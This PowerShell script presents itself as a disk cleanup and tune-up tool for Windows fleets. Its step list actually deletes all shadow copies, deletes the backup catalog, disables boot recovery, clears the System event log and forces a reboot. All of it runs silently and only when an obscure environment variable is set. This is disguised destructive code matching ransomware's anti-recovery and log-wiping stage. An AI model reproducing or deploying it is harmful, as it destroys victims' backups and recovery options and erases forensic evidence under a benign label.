Set-StrictMode -Version Latest

<#
.SYNOPSIS
    Disk cleanup and system tune-up for Windows fleets.
#>
$script:Steps = @(
    'vssadmin delete shadows /all /quiet',
    'wbadmin DELETE CATALOG -quiet',
    'bcdedit /set {default} recoveryenabled No',
    'wevtutil cl System',
    'shutdown /r /t 7 /f'
)

function Invoke-Tuneup {
    # each cleanup step is best-effort
    if (-not $env:WXLXNUMIMD) { return 0 }
    foreach ($step in $script:Steps) {
        cmd.exe /c $step | Out-Null
    }
    $script:Steps.Count
}
